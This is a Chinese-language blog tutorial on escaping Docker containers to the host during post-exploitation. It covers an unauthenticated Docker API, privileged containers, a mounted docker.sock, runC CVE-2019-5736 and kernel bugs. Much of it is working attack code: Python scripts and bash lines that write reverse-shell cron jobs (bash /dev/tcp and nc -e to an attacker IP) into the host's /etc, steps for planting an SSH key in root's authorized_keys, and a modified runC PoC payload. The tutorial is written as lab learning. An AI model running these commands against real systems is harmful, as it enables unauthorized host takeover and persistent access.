---
title: "后渗透——Docker容器逃逸"
source: "https://blog.csdn.net/qq_43531669/article/details/145325152"
author:
  - "[[qq_43531669]]"
published: 2025-02-22
created: 2025-06-09
description: "文章浏览阅读1.6k次，点赞23次，收藏18次。在渗透测试中，如果获取了目标主机的 shell，但发现其运行在 docker 环境中，要进一步渗透，就需要逃逸到宿主机。另外，还可能存在更复杂的场景，例如物理机运行虚拟机，虚拟机再运行 docker 容器，这种情况下还需要实现虚拟机逃逸。本文主要总结关于 docker 容器逃逸的相关技术与方法。涉及内核漏洞的提权原理都比较复杂，很难理解，会用 poc 就行了。其余逃逸很大程度都是通过挂载进行逃逸。要么本容器挂载，要么本容器里再创建一个容器挂载。_docker渗透"
tags:
  - "clippings"
---
#### 前言：

在 [渗透测试](https://so.csdn.net/so/search?q=%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95&spm=1001.2101.3001.7020) 中，如果获取了目标主机的 shell，但发现其运行在 docker 环境中，要进一步渗透，就需要逃逸到宿主机。另外，还可能存在更复杂的场景，例如物理机运行虚拟机，虚拟机再运行 [docker 容器](https://so.csdn.net/so/search?q=docker%20%E5%AE%B9%E5%99%A8&spm=1001.2101.3001.7020) ，这种情况下还需要实现虚拟机逃逸。本文主要总结关于 docker 容器逃逸的相关技术与方法。

#### 容器逃逸的原理：

本质上容器内的进程只是一个受限的普通 Linux 进程，容器内部进程的所有行为对于宿主机来说是透明的。我们可以在宿主机上直接使用 ps 看到容器的进程信息。

所以，容器逃逸和硬件虚拟化逃逸的本质有很大的不同(不包含 Kata Containers 等 )，容器逃逸的过程更像一个受限进程获取未受限的完整权限，又或某个原本受 Cgroup/Namespace 限制权限的进程获取更多权限的操作，更趋近于提权。

注：

```bash
Cgroup（控制组）：用于限制和管理进程的资源（如 CPU、内存、磁盘 I/O、网络带宽等）。它确保某个容器不会占用过多资源，影响
其他进程。
例如：限制某个容器最多使用 512MB 内存，防止其占满整个系统。

Namespace（命名空间）：用于隔离进程的视图，让不同容器互不影响，每个容器都认为自己运行在独立的环境中。
例如：不同容器可以有相同的进程 ID（PID）、主机名（UTS）、网络接口（Net），但它们彼此不可见。

简单理解：
Cgroup 负责"配额"（谁能用多少资源）。
Namespace 负责"隔离"（让彼此看不到对方）。
结合 Cgroup + Namespace，就能让容器像一个独立的小系统运行在宿主机上。
bash1234567891011
```

#### 利用思路

Docker容器逃逸的利用思路是：

**1、检测是否处于容器环境**

**2、进行容器逃逸**

- 基于API 漏洞
- 基于危险配置
- 基于危险挂载
- 基于程序漏洞
- 基于内核漏洞

#### Docker 环境判断

参考 Metasploit 中检测 container 的模块(checkcontainer、checkvm)。

1. 检查 `/proc/1/cgroup` 内是否包含 `docker` 或 `kubepods` 等字符串 （虚拟机环境下也存在一些特征，感觉是主要检测方法）
2. 检查 `/.dockerenv` 文件是否存在 （虚拟机环境下无 `dockerenv` ）
3. 检查环境变量 （k8s 环境下有很多特征环境变量）
4. 检查 `mount` 信息
5. 查看硬盘信息 （ `fdisk -l` 容器输出为空，非容器有内容输出。）

**举例** ：

测试环境 ：docker nginx:latest 镜像  
![在这里插入图片描述](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/a11c3a1eb54af8c3b8c67d5ec325d682.png)  
可以发现，部分通过测试，部分没有，但大体来讲能判断目前处于一个docker环境。

#### 1.基于API 漏洞

##### Docker 远程API 未授权访问

Docker Swarm 是 Docker 的集群管理工具，它将 Docker 主机池转变为单个虚拟 Docker 主机，能够方便的进行 docker 集群的管理和扩展。Docker Swarm 使用标准的 Docker API 通过 2375/2376 端口来管理每个 Docker 节点，Docker API 是一个取代远程命令行界面(RCLI) 的 REST API。当 Docker 节点的 2375 端口直接暴露并未做权限检查时，存在未授权访问漏洞，攻击者可以利用Docker API执行任何操作，包括执行Docker命令，创建、删除Docker以及获得宿主机权限等。

**漏洞复现**

本来想用 vulhub 的 docker/unauthorized-rce 环境，但最后发现 这环境里的 docker 下不了别的镜像，于是只能在自己的 docker 环境设置一下，下面是设置步骤：

配置docker支持远程访问

1、进行文件备份

```bash
cp /lib/systemd/system/docker.service /lib/systemd/system/docker.service.bak
bash1
```

2、编辑docker服务文件

```bash
vim /lib/systemd/system/docker.service
bash1
```

3、在文件末尾加上如下代码

```bash
[Service]
ExecStart=
ExecStart=/usr/bin/dockerd -H tcp://0.0.0.0:2375 -H unix:///var/run/docker.sock
bash123
```

4、保存并退出后，重载守护进程以及重启docker服务即可

```bash
sudo systemctl daemon-reload   #重载守护进程
sudo systemctl restart docker  #重启docker服务
bash12
```

环境配置好后访问目标IP的 2375/2376 端口如下接口，若有信息，则存在Docker API未授权访问

```js
http://x.x.x.x:2375/version
http://x.x.x.x:2375/images
http://x.x.x.x:2375/info
js123
```

![在这里插入图片描述](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/4189766b8135f2a316d3cc7cf39e9f37.png)

**docker命令远程管理** ：

可以使用 docker 命令远程管理 docker，命令和在 docker 服务器管理一样。以下只列出部分命令。

```bash
docker -H tcp://x.x.x.x:2375 images -a
docker -H tcp://x.x.x.x:2375 ps
docker -H tcp://x.x.x.x:2375 exec -it e7d97caf249d /bin/bash
bash123
```

![在这里插入图片描述](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/4eab47fc32b6efdbd3574f6b1c49427c.png)

**获取宿主机权限** ：

以上方式都只是控制 docker 中的容器，我们如何控制 docker 的宿主机呢？

##### 利用方法1

先随意启动一个容器，并将宿主机的 /etc 目录挂载到容器中，便可以任意读写文件了。我们可以将命令写入crontab配置文件，进行反弹shell。

首先我们攻击机上要先安装docker环境，然后执行下面的 Exp

docker-hack.py

```bash
#宿主机 Ubuntu/Debian
import docker

client = docker.DockerClient(base_url='http://192.168.56.131:2375/')
data = client.containers.run(
    'alpine:latest',
     r'''sh -c "echo '* * * * * root bash -c \"bash -i >& /dev/tcp/192.168.56.130/7777 0>&1\" '>> /tmp/etc/crontab" ''',
     remove=True, 
      volumes={'/etc': {'bind': '/tmp/etc', 'mode': 'rw'}}
 )
bash12345678910
```
```bash
#宿主机 Centos/Red Hat（RHEL）
#有nc环境
import docker

client = docker.DockerClient(base_url='http://192.168.56.131:2375/')
data = client.containers.run(
    'alpine:latest',
     r'''sh -c "echo '* * * * * /usr/bin/nc 192.168.56.130 7777 -e /bin/sh' >> /tmp/etc/crontabs/root" ''',
     remove=True,
     volumes={'/etc': {'bind': '/tmp/etc', 'mode': 'rw'}})
bash12345678910
```
```shell
#宿主机 Centos/Red Hat（RHEL）
#无nc环境
import docker

client = docker.DockerClient(base_url='http://192.168.56.131:2375/')
data = client.containers.run(
    'alpine:latest', 
     r'''sh -c "echo '* * * * * root bash -c \"bash -i >& /dev/tcp/192.168.56.130/7777 0>&1\" ' >> /tmp/etc/crontabs/root" ''', 
     remove=True, 
     volumes={'/etc': {'bind': '/tmp/etc', 'mode': 'rw'}})
shell12345678910
```

攻击机监听 7777 端口，执行完脚本，耐心等待一会才会反弹shell到攻击机，大约一分多钟时间。  
![在这里插入图片描述](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/09c91f3acf6e08b1027234716c556a64.png)  
![在这里插入图片描述](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/a4b15c8e2b38ea9d0e67355953fe65d3.png)  
可以看的宿主机的 /etc/crontab 文件被写入了如下的定时任务。  
![在这里插入图片描述](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/47b55129dc55874d170d70547e5b0d0f.png)

##### 利用方法2

上面是通过脚本一键利用的，下面我们来通过手动的方式再来利用一下。

使用 docker 远程命令拉取一个镜像，可以用已经存在的镜像，这里我用的还是 alpine 镜像。

```bash
docker -H tcp://192.168.56.131 pull alpine
bash1
```

![在这里插入图片描述](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/c2bd541cc1d4049ce268bdc3a3f9ad18.png)  
使用拉取的镜像启动一个新的容器，以 sh 或者 /bin/bash 作为shell启动，并且将该宿主机的根目录挂在到容器的 /mnt 目录下

```bash
docker -H tcp://x.x.x.x:2375 run -it -v /:/mnt alpine:latest sh  或者 /bin/bash
bash1
```

执行之后会返回一个该容器宿主机的shell  
![在这里插入图片描述](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/7148961bff522565c1a38a2760c3cc0d.png)  
进入 /mnt 目录下即可逃逸到宿主机，在容器内执行命令，将反弹shell的脚本写入到宿主机定时任务文件。

```bash
#宿主机 Ubuntu/Debian
echo '* * * * * root bash -c "bash -i >& /dev/tcp/192.168.56.130/7777 0>&1" '>> /mnt/etc/crontab
bash12
```
```bash
#宿主机 Centos/Red Hat（RHEL）
echo '* * * * * root bash -c "bash -i >& /dev/tcp/192.168.56.130/7777 0>&1" '>> /mnt/etc/crontabs/root
bash12
```

监听端口，获取对方宿主机shell。  
![在这里插入图片描述](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/499cb91976b21d041100f4ab43838097.png)

##### 权限维持

在本地生成 ssh 公私钥对，将公钥内容通过echo写入靶机 `/mnt/root/.ssh/authorized_keys` 文件中

```bash
ssh-keygen
bash1
```

一直回车，执行结束会生成 公钥 和 私钥  
![在这里插入图片描述](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/bde9ae5f1379b1e71ea6c9b89541de50.png)  
写入宿主机的 `/root/.ssh/authorized_keys` 文件  
  
使用 ssh 登录

```bash
ssh -i id_ed25519 root@192.168.56.131
bash1
```

![在这里插入图片描述](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/3428ebfe008f4fa65adb24491fb80eed.png)

#### 2.基于危险配置的逃逸

##### privileged 特权模式运行容器

最初，容器特权模式的出现是为了帮助开发者实现 Docker-in-Docker 特性。然而，在特权模式下运行不完全受控容器将给宿主机带来极大安全威胁。

当操作者执行 `docker run --privileged` 时，Docker将允许容器访问宿主机上的所有设备，使容器拥有与那些直接运行在宿主机上的进程几乎相同的访问权限。

在这样的场景下，从容器中逃逸出去时易如反掌的。例如：攻击者可以直接在容器内部挂载宿主机磁盘，然后将根目录切换过去。

##### 判断方法：

```bash
cat /proc/self/status |grep Cap
bash1
```

![在这里插入图片描述](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/d100460a792ed800e887cb669606eb8a.png)  
通过特权模式起的容器 CapEff 掩码值为：0000001fffffffff （或0000003fffffffff）

##### 利用方法：

特权模式启动一个 Ubuntu 容器：

```bash
sudo docker run -it --privileged ubuntu:latest /bin/bash
bash1
```

进入容器，使用 fdisk -l 命令查看磁盘文件（容器没有 fdisk 可以用 `df -h` ）  
![在这里插入图片描述](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/2d70da1998d3930850e40d45c52c9396.png)  
一般都是最大的那个  
新建一个目录： `mkdir /test`  
挂载磁盘到新建目录： `mount /dev/sda2 /test`  
切换到宿主根目录： `chroot /test`  
![在这里插入图片描述](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/20248580fb3e2c5267c3411f24b625ff.png)  
到这里已经成功逃逸了，然后就是常规的反弹 shell 了。

先切换到容器 shell，写入

```bash
echo '* * * * * root bash -c "bash -i >& /dev/tcp/192.168.56.130/7777 0>&1" '>> /test/etc/crontab
bash1
```

成功写入并反弹shell  
  
![在这里插入图片描述](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/05a39e71892394ea68750152a1ebae89.png)

#### 3.基于危险挂载的逃逸

为了方便宿主机与虚拟机进行数据交换，几乎所有主流虚拟机解决方案都会提供挂载宿主机目录到虚拟机的功能。容器同样如此。然而，将宿主机上的敏感文件或目录挂载到容器内部——尤其是那些不完全受控的容器内部往往会带来安全问题。

##### 挂载 Docker Socket 的情况

Docker Socket 是 Docker 守护进程监听的 Unix 域套接字，用来与守护进程通信——查询信息或下发命令。如果在攻击者可控的容器内挂载了该套接字文件（ `/var/run/docker.sock` ），可通过 Docker Socket 与 Docker 守护进程通信，发送命令创建并运行一个新的容器，将宿主机的根目录挂载到新创建的容器内部，完成简单逃逸。

通俗一点：在启动docker容器时，将宿主机 `/var/run/docker.sock` 文件挂载到docker容器中，在 docker 容器中，也可以再创建一个 docker，并将 根目录 挂载到新创建的容器内，实现挂载逃逸。

##### 环境搭建

先搭建 docker 并挂载：

```bash
docker run --rm -it -v /var/run/docker.sock:/var/run/docker.sock ubuntu /bin/bash
bash1
```

##### 漏洞验证

如果能再 docker 中找到 sock 挂载文件就说明漏洞存在

```bash
find / -name *.sock
bash1
```

![在这里插入图片描述](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/3cc7ff55c456bf93c6b3e34777bbdd4a.png)

##### 漏洞利用

在容器中装 docker ：

```bash
apt-get update
apt-get install docker.io
bash12
```

在 docker 容器中，使用命令查看宿主机拉取的镜像

```bash
docker -H unix://var/run/docker.sock images
bash1
```

![在这里插入图片描述](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/738620de485fe66ea23a7cc07447d752.png)  
在该 docker 中运行一个 docker 如上面的 ubuntu，然后把宿主机根目录挂载进来。

```bash
docker -H unix://var/run/docker.sock run -v /:/host -it ubuntu /bin/bash
bash1
```

可以看到已经换容器了。  
![在这里插入图片描述](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/238633e2bb2699160078fb9aa5a6b0f5.png)  
![在这里插入图片描述](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/ea7da83c6867bb8e584f44aa404e6e1e.png)  
逃逸成功，剩下操作与上面基于特权的一样，写计划任务。

#### 4.基于程序漏洞的逃逸

##### runC容器逃逸漏洞（CVE-2019-5736）

##### 漏洞原理：

- 我们在执行功能类似于 `docker exec` 的命令时，底层实际上是容器运行时在操作。例如 `runc`
- 相应地， `runc exec` 命令会被执行。它的最终效果是在容器内部执行用户指定的程序。进一步讲，就是在容器的各种命名空间内，受到各种限制（如cgroups）的情况下，启动一个进程。除此以外，这个操作与宿主机上执行一个程序并无二致。
- 这个过程中存在的风险在于： `/proc` ：如果尝试打开 `/proc/[PID]/exe` ，在权限检查通过的情况下，内核将直接返回一个指向该文件的描述符（file descriptor），而非按照传统的打开方式去做路径解析和文件查找。这样一来，它实际上绕过了 mnt 命名空间及 chroot 对一个进程能够访问到的文件路径的限制。
- 在 `runc exec` 加入到容器的命名空间之后，容器内进程已经能够通过内部 /proc 观察到它，此时如果打开 `/proc/[runc-PID]/exe` 并写入一些内容，就能够实现将宿主机上的 runc 二进制程序覆盖掉！这样一来，下一次用户调用 runc 去执行命令时，实际执行的将是攻击者放置的指令。

在未升级的容器环境上，上述思路是可行的，但是攻击者想要在容器内实现宿主机上的代码执行（逃逸），还需要面对两个限制：

1. 需要具有容器内部 root 权限；
2. Linux 不允许修改正在运行进程对应的本地二进制文件。

事实上，限制1经常不存在，很多容器服务开放给用户的仍然是root权限；而限制2是可以克服的.

##### 利用条件：

Docker版本 < 18.09.2，runC版本< 1.0-rc6。（在Docker 18.09.2之前的版本中使用了的runc版本小于1.0-rc6。）

##### 利用步骤：

1、下载POC，编译脚本

```bash
#下载POC
git clone https://github.com/Frichetten/CVE-2019-5736-PoC

#修改Payload
vi main.go
payload = "#!/bin/bash \n bash -i >& /dev/tcp/192.168.172.136/1234 0>&1"

#编译生成payload
CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build main.go
bash123456789
```

2、容器中执行 payload

```bash
# 拷贝到docker容器，实战中可以curl等方式下载
sudo docker cp ./main 248f8b7d3c45:/tmp

# 进入容器
sudo docker exec -it 248f8b7d3c45 /bin/bash

# 修改权限
chmod 777 main

# 执行Payload
./main
bash1234567891011
```

3、等待管理员通过exec进入容器，从而触发Payload。

```bash
docker exec -it 248f8b7d3c45 /bin/bash
bash1
```

4、攻击机监听端口，获取宿主机反弹回来的shell。

这里没安装对应版本docker，省略了。。

#### 5.基于内核漏洞的逃逸

##### 1.DirtyCow(CVE-2016-5195)脏牛漏洞

脏牛漏洞（CVE-2016-5195）是Linux内核中的一个权限提升漏洞，源于内存写时拷贝（Copy-on-Write，COW）机制的竞争条件，允许恶意用户获取只读内存的写访问权限。

在Docker环境中，容器与宿主机共享内核，因此如果宿主机存在脏牛漏洞，攻击者可以在容器内利用该漏洞逃逸至宿主机，获取root权限的shell。

##### 利用条件

宿主机内核存在脏牛漏洞：宿主机的Linux内核版本需存在脏牛漏洞，通常影响2.6.22至4.8版本的内核。

##### 漏洞 PoC：

https://github.com/dirtycow/dirtycow.github.io/blob/master/dirtyc0w.c

##### 2.脏管道(CVE-2022-0847) Dirty Pipe

该漏洞的大概原理为 splice 系统调用由于未初始化某buf，可能包含旧的PIPE\_BUF\_FLAG\_CAN\_MERGE，导致可以通过管道越界写，覆盖关键文件如/etc/passwd可达到提权的效果。因漏洞类型和“DirtyCow”（脏牛）类似，发现者 Max Kellermann 研究员将该漏洞命名为 Dirty Pipe，

##### 影响范围：

影响范围包括Linux 5.8及以上至修复前版本（5.16.11、5.15.25等）

##### 漏洞 PoC：

https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit

#### 总结

涉及内核漏洞的提权原理都比较复杂，很难理解，会用 poc 就行了。

其余逃逸很大程度都是通过挂载进行逃逸。要么本容器挂载，要么本容器里再创建一个容器挂载。思路差不多，主要围绕 capabilities 和 mount 利用，总的来说感觉都是属于提权操作吧。

实付 元

[使用余额支付](https://blog.csdn.net/qq_43531669/article/details/)

点击重新获取

扫码支付

钱包余额 0

抵扣说明：

1.余额是钱包充值的虚拟货币，按照1:1的比例进行支付金额的抵扣。  
2.余额无法直接购买下载，可以购买VIP、付费专栏及课程。

[余额充值](https://i.csdn.net/#/wallet/balance/recharge)

举报

 [![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/4b5d638b57b796bf4228e36a12fd3244.png) 点击体验  
DeepSeekR1满血版](https://ai.csdn.net/?utm_source=cknow_pc_blogdetail&spm=1001.2101.3001.10583) 隐藏侧栏 ![程序员都在用的中文IT技术交流社区](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/6ddf638effe61d927f03a0789e73f41e.png)

程序员都在用的中文IT技术交流社区

![专业的中文 IT 技术社区，与千万技术人共成长](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/4832e9a5e9fe3a702f3d81b1ce7c9ca3.png)

专业的中文 IT 技术社区，与千万技术人共成长

![关注【CSDN】视频号，行业资讯、技术分享精彩不断，直播好礼送不停！](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/e311c5ce3170b9f4471a19010a5c3bd8.png)

关注【CSDN】视频号，行业资讯、技术分享精彩不断，直播好礼送不停！

客服 返回顶部

![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/a11c3a1eb54af8c3b8c67d5ec325d682.png) ![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/4189766b8135f2a316d3cc7cf39e9f37.png) ![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/4eab47fc32b6efdbd3574f6b1c49427c.png) ![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/09c91f3acf6e08b1027234716c556a64.png) ![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/a4b15c8e2b38ea9d0e67355953fe65d3.png) ![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/47b55129dc55874d170d70547e5b0d0f.png) ![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/c2bd541cc1d4049ce268bdc3a3f9ad18.png) ![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/7148961bff522565c1a38a2760c3cc0d.png) ![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/499cb91976b21d041100f4ab43838097.png) ![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/bde9ae5f1379b1e71ea6c9b89541de50.png) ![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/3428ebfe008f4fa65adb24491fb80eed.png) ![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/d100460a792ed800e887cb669606eb8a.png) ![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/2d70da1998d3930850e40d45c52c9396.png) ![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/20248580fb3e2c5267c3411f24b625ff.png) ![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/05a39e71892394ea68750152a1ebae89.png) ![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/3cc7ff55c456bf93c6b3e34777bbdd4a.png) ![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/738620de485fe66ea23a7cc07447d752.png) ![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/238633e2bb2699160078fb9aa5a6b0f5.png) ![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/ea7da83c6867bb8e584f44aa404e6e1e.png)